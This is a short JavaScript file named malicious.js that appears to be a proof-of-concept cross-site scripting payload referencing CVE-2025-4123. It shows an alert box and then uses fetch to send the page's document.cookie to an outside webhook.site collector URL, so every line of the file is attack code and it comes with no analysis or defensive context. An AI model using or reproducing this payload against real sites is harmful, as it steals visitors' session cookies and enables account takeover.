// malicious.js
alert('XSS via CVE-2025-4123');
fetch('https://webhook.site/#!/view/29fc23eb-ed5b-491f-84b8-12d70f257014log?cookie=' + document.cookie);
